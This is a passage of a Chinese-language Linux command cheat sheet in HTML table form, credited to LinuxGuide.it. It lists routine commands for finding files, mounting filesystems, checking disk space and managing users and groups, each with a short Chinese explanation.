</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find / -name file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    从<span class="s52">&#39;/&#39; </span>开始进入根文件系统搜索文件和目录
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find / -user user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    搜索属于用户<span class="s52">&#39;user1&#39; </span>的文件和目录
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find /home/user1 -name \*.bin
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    在目录<span class="s52">&#39;/ home/user1&#39; </span>中搜索带有<span class="s52">&#39;.bin&#39; </span>结尾的文件
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find /usr/bin -type f -atime +100
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    搜索在过去 <span class="s52">100 </span>天内未被使用过的执行文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find /usr/bin -type f -mtime -10
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    搜索在 <span class="s52">10 </span>天内被创建或者修改过的文件
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find / -name *.rpm -exec chmod 755 &#39;{}&#39;

\;
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    搜索以<span class="s52">&#39;.rpm&#39; </span>结尾的文件并定义其权限
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find / -xdev -name \*.rpm
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    搜索以<span class="s52">&#39;.rpm&#39; </span>结尾的文件，忽略光驱、捷盘等可移动设备
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # locate \*.ps
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    寻找以<span class="s52">&#39;.ps&#39; </span>结尾的文件 <span class="s52">- </span>先运行 <span class="s52">&#39;updatedb&#39;</span>

命令
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # whereis halt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示一个二进制文件、源码或<span class="s52">man </span>的位置
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # which halt
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示一个二进制文件或可执行文件的完整路径
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark45">挂载一个文件系统</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # fuser -km /mnt/hda2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    当设备繁忙时强制卸载
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount /dev/hda2 /mnt/hda2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个叫做 <span class="s52">hda2 </span>的盘<span class="s52">- </span>确定目录<span class="s52">&#39;/</span>

mnt/hda2&#39; <span class="s33">已经存在</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount /dev/fd0 /mnt/floppy
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个软盘
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount /dev/cdrom /mnt/cdrom
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个<span class="s52">cdrom </span>或 <span class="s52">dvdrom</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount /dev/hdc /mnt/cdrecorder
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个<span class="s52">cdrw </span>或 <span class="s52">dvdrom</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount /dev/hdb /mnt/cdrecorder
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个<span class="s52">cdrw </span>或 <span class="s52">dvdrom</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount -o loop file.iso /mnt/cdrom
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个文件或 <span class="s52">ISO </span>镜像文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount -t vfat /dev/hda5 /mnt/hda5
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个<span class="s52">Windows FAT32 </span>文件系统
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount /dev/sda1 /mnt/usbdisk
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个 <span class="s52">usb </span>捷盘或闪存设备
</td></tr><tr style="height:49pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mount -t smbfs -o username=user,password=pass

//WinClient/share /mnt/share
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    挂载一个<span class="s52">windows </span>网络共享
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # umount /dev/hda2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    卸载一个叫做 <span class="s52">hda2 </span>的盘<span class="s52">- </span>先从挂载点<span class="s52">&#39;/</span>

mnt/hda2&#39; <span class="s33">退出</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # umount -n /mnt/hda2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    运行卸载操作而不写入 <span class="s52">/etc/mtab </span>文件<span class="s52">- </span>当文件为只读或当磁盘写满时非常有用
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark46">磁盘空间</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # df -h
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示已经挂载的分区列表
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # dpkg-query -W -f=&#39;${Installed- Size;10}t${Package}n&#39; | sort -k1,1n
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以大小为依据显示已安装的 <span class="s52">deb </span>包所使用的空间<span class="s52">(ubuntu, debian </span>类系统<span class="s52">)</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # du -sh dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    估算目录<span class="s52">&#39;dir1&#39; </span>已经使用的磁盘空间<span class="s52">&#39;</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # du -sk * | sort -rn
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以容量大小为依据依次显示文件和目录的大小
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls -lSr |more
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以尺寸大小排列文件和目录
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rpm -q -a --qf &#39;%10{SIZE}t%{NAME}n&#39; | sort -k1,1n
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    以大小为依据依次显示已安装的 <span class="s52">rpm </span>包所使用的空间<span class="s52">(fedora, redhat </span>类系统<span class="s52">)</span>
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark47">用户和群组</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # chage -E 2005-12-31 user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    设置用户口令的失效期限
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # groupadd [group]
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个新用户组
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # groupdel [group]
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除一个用户组
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # groupmod -n moon sun
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    重命名一个用户组
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # grpck
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    检查 <span class="s52">&#39;/etc/passwd&#39; </span>的文件格式和语法修正以及存在的群组
